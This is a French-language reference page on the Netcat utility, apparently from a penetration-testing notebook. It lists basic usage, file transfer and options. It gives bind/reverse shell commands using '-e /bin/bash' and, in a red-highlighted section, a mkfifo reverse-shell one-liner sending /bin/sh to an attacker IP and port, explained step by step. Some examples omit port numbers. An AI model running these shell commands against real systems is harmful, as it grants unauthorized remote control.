---
description: Netcat - Outil de Transfert de Données Réseau
---

# Netcat

<mark style="color:yellow;">Description :</mark>&#x20;

Netcat, également connu sous le nom de "nc", est un utilitaire puissant en ligne de commande permettant d'établir des connexions TCP/UDP, d'envoyer et de recevoir des données sur le réseau. Il peut être utilisé pour des tâches variées telles que des transferts de fichiers, des tests de port, des shells inversés, etc.

<mark style="color:yellow;">Exemples d'utilisation :</mark>

1. Connexion TCP à un hôte distant sur un port spécifique : `nc <adresse_IP>`
2. Écoute sur un port spécifique pour une connexion entrante : `nc -l -p`
3. Transfert de fichiers : \
   \
   \- Sur la machine destinataire : `nc -l -p > fichier_reçu` \
   \- Sur la machine source : `nc <adresse_IP_dest> < fichier_local`\

4. Création d'un shell inversé : \
   \- Sur la machine destinataire : \
   `nc -l -p -e cmd.exe` (Windows) \
   `nc -l -p -e /bin/bash` (Linux)  \
   \
   \- Sur la machine source : `nc <adresse_IP_dest>`



<mark style="color:yellow;">Options Principales :</mark>

* \-l : Mode écoute pour les connexions entrantes.
* \-p : Spécifier le numéro de port.
* \-e : Exécuter la commande spécifiée après la connexion (shell inversé).
* \-v : active le mode Verbose ( sortie détaillée)
* \-n : Uniquement les numéros IP, aucun nom DNS
*

<mark style="color:red;">Netcat étant rarement installé sur les systèmes de productions, et même s'il l'est, il y'a plusieurs versions de netcat dont certaines ne supportent pas le -e,</mark>

<mark style="color:red;">Si vous avez la mauvaise version de netcat, voici une commande qui pourrait vous donner un reverse shell :</mark>&#x20;

&#x20;`rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attaquant_ip> <attaquant_port> >/tmp/f`

<mark style="color:red;">Détails :</mark>&#x20;

* rm /tmp/f : Supprime le fichier temporaire /tmp/f (s'il existe).
* mkfifo /tmp/f : Crée un tube nommé (fifo) dans /tmp appelé /tmp/f.
* cat /tmp/f | /bin/sh -i 2>&1 : Lit les données du tube et les passe au shell interactif (/bin/sh).
* nc \<attaquant\_ip> \<attaquant\_port> >/tmp/f : Redirige les données du shell vers l'attaquant via Netcat.
